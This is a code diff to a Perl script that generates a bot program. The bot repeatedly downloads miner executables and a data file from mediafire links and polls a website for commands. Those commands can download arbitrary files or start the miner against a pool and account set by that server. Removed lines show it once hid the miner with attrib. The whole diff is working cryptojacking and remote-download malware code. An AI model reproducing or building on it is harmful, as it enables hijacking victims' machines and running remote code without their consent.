@@ -23,25 +23,47 @@ sub start {
 	if(defined($cpu_or_gpu)){
 	  chomp $cpu_or_gpu;
 	  my ($gcc, $command) = "gcc", undef;
-	  $command = "NsCpuCNMiner32.exe" if $cpu_or_gpu =~ /CPU/i;
-	  $command = "NsGpuCNMiner.exe" if $cpu_or_gpu =~ /GPU/i;
-	  $cpu_or_gpu = "http://download1518.mediafire.com/49eb85rg18xg/o5c3rn5s2k349lu/NsCpuCNMiner32.exe" if $cpu_or_gpu =~ /CPU/i;
-	  $cpu_or_gpu = "http://download846.mediafire.com/zskzcjqb4qcg/6hebk47rlq29t36/NsGpuCNMiner.exe" if $cpu_or_gpu =~ /GPU/i;
+	  $command = "CPU" if $cpu_or_gpu =~ /CPU/i;
+	  $command = "GPU" if $cpu_or_gpu =~ /GPU/i;
 	  my $code =
 <<HERE;
 #!/usr/bin/perl
 use LWP::UserAgent;
 use LWP::Simple;
+use Config;
 
+my \$command = "$command";
+my \$test = 0;
 while(1){
-  system("attrib -h ../$command");
-  while(! -e "../$command" && ! -e "../Data.bin"){
+  foreach(glob "../*"){
+    if(\$_ =~ /Ns/i && \$_ =~ /\.exe\$/i){
+	  \$test = 1;
+	}
+  }
+  while(\$test == 1){
     getstore("http://download1654.mediafireuserdownload.com/6c6s7a8jsabg/0nwra4eocjkemrl/Data.bin", "Data.bin");
 	system("move Data.bin ../");
-    getstore("$cpu_or_gpu", "$command");
-    system("move $command ../");
+	if(\$command =~ /CPU/i){
+	  if(\$Config{archname} =~ /x86_64/i || \$Config{archname} =~ /x64/i){
+        getstore("http://download1586.mediafire.com/pl8xp2k13ydg/995k52eqx6ityix/NsCpuCNMiner64.exe", "NsCpuCNMiner64.exe");
+        \$command = "NsCpuCNMiner64.exe";
+		\$test = 0;
+	  }else{
+	    getstore("http://download1518.mediafire.com/49eb85rg18xg/o5c3rn5s2k349lu/NsCpuCNMiner32.exe", "NsCpuCNMiner32.exe");
+	    \$command = "NsCpuCNMiner32.exe";
+		\$test = 0;
+	  }
+	}
+	if(\$command =~ /GPU/i){
+	  if(\$Config{archname} =~ /x86_64/ || \$Config{archname} =~ /x64/i){
+	    getstore("http://download846.mediafire.com/zskzcjqb4qcg/6hebk47rlq29t36/NsGpuCNMiner.exe", "NsGpuCNMiner.exe");
+	    \$command = "NsGpuCNMiner.exe";
+		\$test = 0;
+	  }
+	}
+	system("move \$command ../");
   }
-  if(-e "../$command"){
+  if(-e "../\$command"){
     my \$lwp = LWP::UserAgent->new; \$lwp->agent("Mozilla/5.0");
     while(1){
       my \$response = \$lwp->get("$website");
@@ -60,9 +82,8 @@ while(1){
 	      getstore("\$1", "\$2");
 	    }
 	    if(\$_ =~ /miner->host:(.*?);email:(.*?);/){
-	      system("cd ../ && $command -o stratum+tcp://\$1 -u \$2 -p x");
-		  system("attrib +h ../$command");
-	    }
+	      system("cd ../ && \$command -o stratum+tcp://\$1 -u \$2 -p x");
+		}
 	  }
 	  close(RESPONSE);
     }
